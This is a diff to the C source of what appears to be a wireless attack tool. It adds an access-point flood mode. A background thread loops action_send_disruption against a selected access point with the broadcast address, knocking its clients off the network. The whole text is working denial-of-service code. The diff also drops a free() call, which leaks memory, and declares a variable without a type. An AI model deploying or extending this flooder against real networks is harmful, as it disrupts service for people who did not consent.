@@ -1,9 +1,14 @@
 #include <stdlib.h>
+#include <pthread.h>
 #include "controllers.h"
 
-void action_distrupt_station(struct loki_state*);
-void action_distrupt_network(struct loki_state*);
-void action_send_disruption(uint8_t*, uint8_t*, uint8_t*, uint16_t, uint8_t, pcap_t*);
+static void action_distrupt_station(struct loki_state*);
+static void action_distrupt_network(struct loki_state*);
+static void action_flood_ap(struct loki_state*);
+static void *flood(void*);
+static void action_send_disruption(uint8_t*, uint8_t*, uint8_t*, uint16_t, uint8_t, pcap_t*);
+
+static flood_ap = 0;
 
 struct mode_controller *create_mode_controller() {
 	struct mode_controller *controller;
@@ -111,6 +116,16 @@ void controller_ap_mode(int code, struct loki_state *state) {
 		action_distrupt_network(state);
 		break;
 
+	case 'F':
+		if(flood_ap) {
+			flood_ap = 0;
+			state->status_msg = NULL;
+			break;
+		}
+		flood_ap = 1;
+		action_flood_ap(state);
+		break;
+
 	case 'j':
 		do {
 			if(i++ == state->log->beacon.selected)
@@ -138,6 +153,7 @@ void controller_ap_mode(int code, struct loki_state *state) {
 		state->current_controller = state->controllers.overview;
 		state->current = state->screens.overview;
 		state->status_msg = NULL;
+		flood_ap = 0;
 		pthread_mutex_unlock(&scrmutex);
 		break;
 	}
@@ -253,8 +269,51 @@ void action_send_disruption(uint8_t *macAp, uint8_t *macSta, uint8_t *bssid, uin
 		usleep(50000);
 		fflush(stdout);
 
-		free(packetToSta);
+		
 		if(!broadcast)
 			free(packetToAp);
+	}
+}
+
+void action_flood_ap(struct loki_state *state) {
+	struct beacon_frame_item *item = state->log->beacon.list;
+	uint8_t *macAp;
+	uint16_t i;
+	char *status;
+
+	pthread_t flooder;
+
+	i = 0;
+	do {
+		if(i++ == state->log->beacon.selected)
+			break;
+
+	} while( (item = item->next) != NULL);
+	macAp = item->mac;
+
+	status = (char*)malloc(sizeof(char)*48);
+	sprintf(status, "Flooding access point %s", print_mac_address(macAp));
+	set_status_message(status, state);
+	pthread_create( &flooder, NULL, flood, (void*)state);
+}
+
+void *flood(void *data) {
+	struct loki_state *state = (struct loki_state*)data;
+	struct beacon_frame_item *item = state->log->beacon.list;
+	uint8_t macSta[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff },
+		*macAp;
+	uint16_t i;
+
+	i = 0;
+	do {
+		if(i++ == state->log->beacon.selected)
+			break;
+
+	} while( (item = item->next) != NULL);
+
+	macAp = item->mac;
+
+	while(flood_ap) {
+		action_send_disruption(macAp, macSta, macAp, 10, 0, state->handle);
 	}
 }
